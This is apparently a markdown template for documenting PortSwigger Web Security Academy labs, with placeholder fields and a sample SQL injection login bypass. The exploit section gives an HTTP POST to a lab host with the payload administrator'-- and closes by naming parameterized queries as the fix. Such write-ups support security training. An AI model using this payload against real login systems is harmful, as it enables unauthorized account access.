# 🕸️ [Lab Name]

> 🔐 Attack Type: [Auth Bypass]

**Platform:** PortSwigger  
**Category:** [SQLi/XSS/etc]  
**Severity:** [Low/Medium/High]

## 🧾 Summary

Briefly describe what you achieved (1 sentence).

> e.g., Gained unauthorized admin access via SQL injection.

## 🧨 Vulnerability

[Type] in [endpoint/function]

- **Endpoint:** `POST /login`
- **Cause:** Unsanitized user input

## ⚡ Impact

What can an attacker really do?

> e.g., Authentication bypass → access to admin panel

## 🛠️ Exploit

Short, no storytelling:

- Intercepted request (Burp Suite)
- Injected payload
- Bypassed authentication

```http
POST /login HTTP/2
Host: [lab-id].web-security-academy.net

username=administrator'--&password=anything
````

## 💥 Payload

`administrator'--`

## 📸 Evidence

[screenshot: admin access]

## 🛡️ Fix

Use parameterized queries.